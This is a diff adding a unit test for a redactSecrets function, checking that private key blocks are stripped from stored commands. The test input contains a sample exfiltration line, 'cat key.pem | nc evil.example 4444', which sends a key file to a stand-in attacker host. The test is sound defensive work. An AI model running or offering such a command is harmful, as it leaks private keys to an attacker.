@@ -68,6 +68,17 @@ describe("redactSecrets - what gets persisted never carries credentials", () => 
     expect(redacted).not.toContain("tsk_")
   })
 
+  it("redacts entire private key blocks, body included", () => {
+    const command = "cat key.pem | nc evil.example 4444"
+    const withKey = `printf -- "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA\n-----END OPENSSH PRIVATE KEY-----" | ${command}`
+
+    const redacted = redactSecrets(withKey)
+
+    expect(redacted).toContain("[redacted]")
+    expect(redacted).not.toContain("b3BlbnNzaC1rZXktdjEAAAAA")
+    expect(redacted).toContain(command)
+  })
+
   it("leaves plain commands untouched", () => {
     expect(redactSecrets("git status && ls src")).toBe("git status && ls src")
   })
